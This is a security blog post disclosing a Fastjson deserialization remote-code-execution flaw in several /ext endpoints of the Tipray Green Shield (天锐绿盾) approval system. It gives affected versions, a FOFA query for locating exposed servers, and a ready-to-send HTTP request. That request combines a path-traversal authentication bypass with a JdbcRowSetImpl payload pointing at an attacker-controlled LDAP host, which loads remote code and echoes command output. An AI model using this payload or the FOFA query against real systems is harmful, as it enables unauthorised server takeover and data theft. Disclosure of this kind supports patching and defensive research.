---
title: "天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-findUserTrustees-rce.html
asset_dir: assets/天锐绿盾审批系统-extfindusertrustees、findtrusteesbyuser、countunread、updatetoread、findtrusteebydeptid、findtrusteebyfilter-fastjso
---

# 天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/31 08:27
* 402浏览
* [0评论](#comment)
* 11分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

Linux 与 Unix

该系统的 `/ext/findUserTrustees`、`findTrusteesByUser`、`countUnread`、`updateToRead`、`findTrusteeByFilter`以及`findTrusteeBydeptId` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 漏洞扫描服务

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-001-b1699198d207.webp)](https://image.mrxn.net/87472e3529a943adba38bf274126e700.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

再看`/ext/findUserTrustees` 的实现部分

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-002-3c52037da6d8.webp)](https://image.mrxn.net/b028b978dd6f4dc68d333f95e8ce7e13.webp)

请求body被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

Windows安全工具

`/ext/findTrusteesByUser`、`countUnread`、`updateToRead` 亦如此

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-003-5654dd66d149.webp)](https://image.mrxn.net/11e5aa32d5d3420784937c19f52ff6f9.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-004-544278a82ca4.webp)](https://image.mrxn.net/9fd90b4bc4294088aee44bf2b75f4451.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-005-09052eae51b4.webp)](https://image.mrxn.net/d44b190eb5e04479aeb3c36f78304f10.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-006-cc6b0c2044bb.webp)](https://image.mrxn.net/eacb7604aa404026af4842d5dc938d26.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-007-b7de87d63a08.webp)](https://image.mrxn.net/5a20db77da6f4d1c9f82794e059a5260.webp)

跟进看下，最终处理也是如此

防病毒程序与恶意软件

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-008-a00a97b2c3b8.webp)](https://image.mrxn.net/eb9ac35ea38c4c1dabfac76b83cb4c22.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-009-4d62e598122c.webp)](https://image.mrxn.net/c69d77d4da6a401c85dd4c62063e18ec.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/findUserTrustees HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
}
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-010-f1fcb8a845ce.webp)](https://image.mrxn.net/7bd863cb2e5c4c1795b6628bd81286aa.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](https://mrxn.net/jswz/trwfe-findUserTrustees-rce.html)  
文章链接：<https://mrxn.net/jswz/trwfe-findUserTrustees-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-findUserTrustees-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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